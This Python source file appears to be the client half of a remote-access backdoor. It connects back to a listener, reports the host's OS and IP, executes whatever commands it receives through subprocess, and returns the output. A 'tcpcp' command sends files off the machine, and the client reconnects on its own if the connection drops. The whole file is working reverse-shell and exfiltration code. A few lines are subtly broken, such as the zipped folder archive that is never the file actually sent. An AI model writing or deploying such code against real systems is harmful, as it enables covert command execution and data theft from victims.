import socket
import subprocess
import platform
import os
import zipfile
import pathlib
import time
from tools.filetransfer import send_file

HOST = 'localhost'
PORT = 9999
BUFFER_SIZE = 1024
TEXT_ENCODING = 'utf-8'
END_STRING = '<none>'


def exec_cmd(cmd, client_socket)  ->  str:
    cmd_comp = list(cmd.split(' '))
    msg = ''
    if cmd_comp[0] == 'cd':
        try:
            os.chdir(cmd_comp[1])
        except Exception as e:
            msg = str(e)

    elif cmd_comp[0] == 'tcpcp':
        path = cmd_comp[1]
        if not os.path.exists(path):
            size = 0
            dest_type = ''
        else:
            #compress if its a folder
            if os.path.isdir(path):
                directory = pathlib.Path(path)
                # recursively compress files
                with zipfile.ZipFile('temp.zip', 'w') as archive:
                    for file_path in directory.rglob('*'):
                        archive.write(
                            file_path,
                            arcname=file_path.relative_to(directory)
                        )
            # try to send file           
            try:
                with open(path, 'rb') as f:
                    send_file(client_socket, f)
            except Exception as e:
                msg = str(e)

    else:
        # normal system command
        try:
            p = subprocess.Popen(cmd_comp, stdout=subprocess.PIPE)
            msg, err = p.communicate()
            msg = msg.decode(TEXT_ENCODING) + (f'\n{err=}' if err!=None else '')
        except Exception as e:
            msg = str(e)
    
    if msg == '' or msg == b'':
        msg = END_STRING

    return msg


def connect_to_host(client, host, port):
    try:
        print("Trying to connect...")
        client.connect((host, port))
        
        system = platform.system()
        ip = socket.gethostbyname(socket.gethostname())
        initial_data = [system, ip]
        client.sendall('\n'.join(initial_data).encode(TEXT_ENCODING))
        print("connected")
        return True

    except Exception as e:
        print(f"Connection failed\n{e}")
        return False


def main():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    connect_to_host(client, HOST, PORT)    

    while True:
        try:
            cmd = client.recv(BUFFER_SIZE).decode(TEXT_ENCODING)
            if cmd != 'ping':
                result = exec_cmd(cmd, client)
                client.sendall(result.encode(TEXT_ENCODING))
                
        except Exception as e:
            if type(e) == BrokenPipeError or e == ConnectionResetError:
                print("Connection lost")
                while not connect_to_host(client, HOST, PORT):
                    time.sleep(3)
            else:
                print(e)
                time.sleep(3)



if __name__ == '__main__':
    main()